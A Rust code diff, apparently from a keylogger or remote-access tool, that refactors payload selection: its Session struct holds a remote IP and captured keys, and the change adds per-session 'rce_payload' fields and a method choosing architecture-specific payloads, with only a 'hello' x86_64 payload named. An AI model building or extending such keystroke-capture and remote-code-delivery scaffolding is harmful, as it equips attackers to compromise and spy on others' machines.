@@ -1,5 +1,4 @@
 pub mod cli;
-pub mod grpc_server;
 pub mod handlers;
 
 use core::fmt;
@@ -13,6 +12,7 @@ use std::{
     sync::OnceLock,
 };
 
+use anyhow::Error;
 use serde::Deserialize;
 
 const COMMON_REPEATED_KEYS: [&str; 4] = [" 󱊷 ", " 󰌑 ", " 󰁮 ", "  "];
@@ -136,6 +136,8 @@ pub struct Session {
 
     pub keys: Vec<String>,
     pub key_codes: Vec<u8>,
+    pub rce_payload: Option<Vec<u8>>,
+    pub rce_payload_buffer: Option<Vec<u8>>,
 }
 impl Session {
     pub fn new(sock_addr: SocketAddr) -> Option<Self> {
@@ -144,8 +146,34 @@ impl Session {
                 ip: *addr.ip(),
                 keys: vec![],
                 key_codes: vec![],
+                rce_payload: None,
+                rce_payload_buffer: None,
             }),
             _ => None,
+        }
+    }
+    pub fn set_rce_payload(&mut self, rce: String, target_arch: TargetArch) -> anyhow::Result<()> {
+        if let Some(_) = self.rce_payload {
+            return Err(Error::msg(format!(
+                "An out payload already exists for session {}",
+                self.ip
+            )));
+        }
+        match target_arch {
+            TargetArch::X86_64 => match &*rce {
+                "hello" => {
+                    self.rce_payload = Some(HELLO_X86_64.to_vec());
+                    Ok(())
+                }
+                _ => Err(Error::msg(format!(
+                    "{} payload unavailable for arch {:#?}",
+                    rce, target_arch
+                ))),
+            },
+            _ => Err(Error::msg(format!(
+                "target arch {:#?} unavailable",
+                target_arch
+            ))),
         }
     }
 }
@@ -180,16 +208,6 @@ impl Display for Session {
     }
 }
 
-pub fn select_payload(rce: String, target_arch: TargetArch) -> Option<Vec<u8>> {
-    if target_arch != TargetArch::X86_64 {
-        return None;
-    }
-    match &*rce {
-        "hello" => Some(HELLO_X86_64.to_vec()),
-
-        _ => None,
-    }
-}
 pub struct Cmd {
     pub shell: String,
     pub stdout: bool,
